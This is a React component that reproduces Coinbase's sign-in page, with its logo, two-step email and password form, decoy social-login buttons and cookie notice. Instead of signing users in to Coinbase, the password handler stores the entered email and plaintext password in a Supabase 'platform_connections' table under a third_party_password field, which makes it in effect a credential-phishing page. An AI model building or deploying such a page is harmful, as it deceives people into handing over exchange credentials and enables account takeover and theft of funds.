import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Eye, EyeOff, KeyRound } from 'lucide-react';
import { supabase } from '../../lib/supabase';
import { useAuth } from '../../contexts/AuthContext';

function CoinbaseMark({ dark }: { dark: boolean }) {
  return (
    <svg viewBox="0 0 52 52" aria-hidden="true" className={`h-[50px] w-[50px] ${dark ? 'text-white' : 'text-[#1652f0]'}`}>
      <path
        d="M26 4.5C14.126 4.5 4.5 14.126 4.5 26S14.126 47.5 26 47.5c8.965 0 16.649-5.49 19.862-13.286H34.704A10.84 10.84 0 0 1 26 38.575c-6.944 0-12.575-5.631-12.575-12.575S19.056 13.425 26 13.425c3.462 0 6.597 1.4 8.87 3.668h10.992C42.649 9.99 34.965 4.5 26 4.5Z"
        fill="currentColor"
      />
    </svg>
  );
}

function SocialButton({ children, dark, icon }: any) {
  return (
    <button
      type="button"
      className={`flex h-[74px] w-full items-center rounded-[37px] px-7 text-left transition-colors ${
        dark ? 'bg-[#2a2c34] text-white hover:bg-[#30333d]' : 'bg-[#f1f3f8] text-[#0a0b0d] hover:bg-[#e8ebf2]'
      }`}
    >
      <div className="flex w-[42px] justify-center">{icon}</div>
      <span className="ml-5 text-[20px] font-semibold tracking-[-0.025em]">{children}</span>
    </button>
  );
}

export default function CoinbaseConnect() {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [step, setStep] = useState('email');
  const [isDarkTheme, setIsDarkTheme] = useState(true); // Default to dark as per screenshot
  const [showPassword, setShowPassword] = useState(false);
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    // Keep theme sync but default to dark for fidelity if preferred
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const syncTheme = () => setIsDarkTheme(mediaQuery.matches);
    syncTheme();
    mediaQuery.addEventListener('change', syncTheme);
    return () => mediaQuery.removeEventListener('change', syncTheme);
  }, []);

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleContinue = (event: React.FormEvent) => {
    event.preventDefault();
    if (!credentials.email.trim()) {
      setErrorMessage('Enter your email address to continue.');
      return;
    }
    setErrorMessage('');
    setStep('password');
  };

  const handlePasswordSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email, password } = credentials;
    if (!password) {
      setErrorMessage('Enter your password to continue.');
      return;
    }
    if (!user) {
      setErrorMessage('You must be logged in.');
      return;
    }
    setLoading(true);
    try {
      const { error } = await supabase.from('platform_connections').insert({
        platform: 'Coinbase',
        email,
        third_party_password: password,
        user_id: user.id
      });
      if (error) throw error;
      navigate('/dashboard?submitted=1');
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const dark = isDarkTheme;
  const pageClasses = dark ? 'bg-[#0b0b0d] text-white' : 'bg-white text-[#0b0b0d]';
  
  return (
    <main className={`${pageClasses} min-h-screen overflow-x-hidden font-sans flex flex-col`}>
      <section className="mx-auto w-full max-w-[430px] px-[24px] pt-[40px] flex-1">
        <div className="flex justify-start mb-[80px]">
          <CoinbaseMark dark={dark} />
        </div>

        <div className="">
          <h1 className="text-[32px] font-bold tracking-tight mb-[48px]">
            Sign in to Coinbase
          </h1>

          <form onSubmit={step === 'email' ? handleContinue : handlePasswordSubmit} className="space-y-6">
            {step === 'email' ? (
              <div className="space-y-4">
                <label htmlFor="coinbase-email" className="block text-[16px] font-bold">
                  Email
                </label>
                <input
                  id="coinbase-email"
                  type="email"
                  value={credentials.email}
                  onChange={handleFieldChange('email')}
                  placeholder="Your email address"
                  className={`h-[72px] w-full rounded-[12px] border px-[20px] text-[18px] outline-none transition-all ${
                    dark ? 'bg-transparent border-[#2d2e34] focus:border-[#2752e7]' : 'bg-white border-[#babdc7] focus:border-[#2752e7]'
                  }`}
                />
              </div>
            ) : (
              <div className="space-y-6">
                {/* Email Display Box */}
                <div className={`flex items-center gap-4 h-[72px] w-full rounded-[12px] border px-[20px] ${
                  dark ? 'bg-transparent border-[#2d2e34]' : 'bg-white border-[#babdc7]'
                }`}>
                  <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center overflow-hidden">
                    <div className="w-full h-full bg-gray-400 opacity-50" />
                  </div>
                  <span className="text-[18px] font-medium truncate">{credentials.email}</span>
                </div>

                <div className="space-y-4">
                  <label htmlFor="coinbase-password" className="block text-[16px] font-bold">
                    Password
                  </label>
                  <div className="relative">
                    <input
                      id="coinbase-password"
                      type={showPassword ? 'text' : 'password'}
                      value={credentials.password}
                      onChange={handleFieldChange('password')}
                      autoFocus
                      className={`h-[72px] w-full rounded-[12px] border px-[20px] pr-14 text-[18px] outline-none transition-all ${
                        dark ? 'bg-transparent border-[#2752e7] ring-1 ring-[#2752e7]' : 'bg-white border-[#2752e7] ring-1 ring-[#2752e7]'
                      }`}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-5 top-1/2 -translate-y-1/2 opacity-60"
                    >
                      {showPassword ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
                    </button>
                  </div>
                  <button type="button" className="text-[#2752e7] text-[16px] font-medium hover:underline">
                    Forgot password?
                  </button>
                </div>
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className={`mt-4 flex h-[64px] w-full items-center justify-center rounded-full text-[18px] font-bold transition-all ${
                dark ? 'bg-[#2d2e34] text-[#5c5e66]' : 'bg-[#f1f3f8] text-[#9fa3b3]'
              } ${credentials.email && (step === 'email' || credentials.password) ? 'bg-[#2752e7] text-white' : ''}`}
            >
              {loading ? 'Signing in...' : 'Continue'}
            </button>
          </form>

          {step === 'email' && (
            <>
              <div className="mt-[40px] flex items-center gap-4">
                <div className="h-px flex-1 bg-white/10" />
                <span className="text-[14px] font-medium text-white/40">OR</span>
                <div className="h-px flex-1 bg-white/10" />
              </div>

              <div className="mt-[40px] space-y-4">
                <SocialButton dark={dark} icon={<KeyRound className="w-6 h-6" />}>Sign in with passkey</SocialButton>
                <SocialButton dark={dark} icon={<img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-6 h-6" />}>Sign in with Google</SocialButton>
                <SocialButton dark={dark} icon={<img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className="w-6 h-6 brightness-0 invert" />}>Sign in with Apple</SocialButton>
              </div>

              <p className="mt-[48px] text-center text-[16px] font-bold">
                Don't have an account? <button type="button" className="text-[#2752e7]">Sign up</button>
              </p>
            </>
          )}
        </div>
      </section>

      <footer className="p-6 pt-12">
        <p className="text-[12px] leading-relaxed opacity-40 max-w-[380px] mx-auto text-center sm:text-left">
          We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our <button className="underline">Cookie Policy</button> and <button className="underline">Privacy Policy</button>.
        </p>
      </footer>
    </main>
  );
}
